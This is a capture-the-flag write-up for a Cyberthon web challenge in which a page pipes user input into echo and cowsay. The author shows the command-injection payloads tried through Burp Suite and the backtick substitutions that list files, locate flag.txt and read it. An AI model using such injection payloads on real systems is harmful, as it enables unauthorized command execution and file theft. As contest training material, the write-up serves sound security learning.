# What does the cow say

Description
---
We've got intel that APOCALYPSE has an important file within this webserver named "flag.txt".

Please help us retrieve its contents.

The URL for this challenge:
http://chals.cyberthon22f.ctf.sg:40201

Solution 
---

Upon loading the webpage, there is a text box where we can enter text and a button below to submit the query. When I pressed the button, this is what the page prints:

    $ echo -e 'Message Here' | cowsay -n

    ______________ 
    < Message Here >
    -------------- 
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||

At first glance, I thought it might have been SSTI due to the page echoing back my input, but after a second look, I realised I was being stupid and it was actually a command injection challenge involving bash script.

The question was: how would I escape the quotes without causing an error?

First, I tried `'ls #`, but the query sanitised the quote, turning the query into `$ echo -e '\x27ls #' | cowsay -n`.
Thus, I decided to use Burp Suite instead, as hopefully I could edit the query through the proxy server instead to escape the quotes.

True enough, when I check the request on Burp, the request has the header `msg` set to the value `'\x27ls #'`. When i try removing the quotes and reverting the sanitisation on the quote however, leaving the header as `msg: 'ls #`, the response throws a 500 Internal Server Error. I tried multiple payloads including `'$(ls)`, ` '; ls; #`, but they both didn't work.

However, when I tried ``ls``, the request in Burp shows this :

    {
        "cmd":"$ echo -e `ls` | cowsay -n",
        "output":
        " _____ \n< app >\n ----- \n        \\   ^__^\n         \\  (oo)\\_______\n            (__)\\       )\\/\\\n                ||----w |\n                ||     ||\n"
    }

Notice how the cowsay output doesn't echo my input, but rather outputs: `'app'`? That means the command injection worked, and my command, `ls`, made the webpage print out the available directory (`'app'`) in the shell's current direcotry.

In the challenge description, we are told that the file `'flag.txt'` exists, so I changed the input to ``find / -name flag.txt``, which should make the webpage output the directory `'flag.txt'` is located in.

True enough, this is the output:

    {
        "cmd":"$ echo -e `find / -name flag.txt` | cowsay -n",
        "output":" _______________________________ \n< /usr/local/flag/here/flag.txt >\n ------------------------------- \n        \\   ^__^\n         \\  (oo)\\_______\n            (__)\\       )\\/\\\n                ||----w |\n                ||     ||\n"
    }

Thus, we know that the location of `'flag.txt'` is `/usr/local/flag/here/flag.txt`.

Now, when we change the input once again to ``cat /usr/local/flag/here/flag.txt``, we get this output:

    {
        "cmd":"$ echo -e `cat /usr/local/flag/here/flag.txt` | cowsay -n",
        "output":" _________________________ \n< Cyberthon{1_L0V3_W4GYU} >\n ------------------------- \n        \\   ^__^\n         \\  (oo)\\_______\n            (__)\\       )\\/\\\n                ||----w |\n                ||     ||\n"
    }

Flag: Cyberthon{1_L0V3_W4GYU}

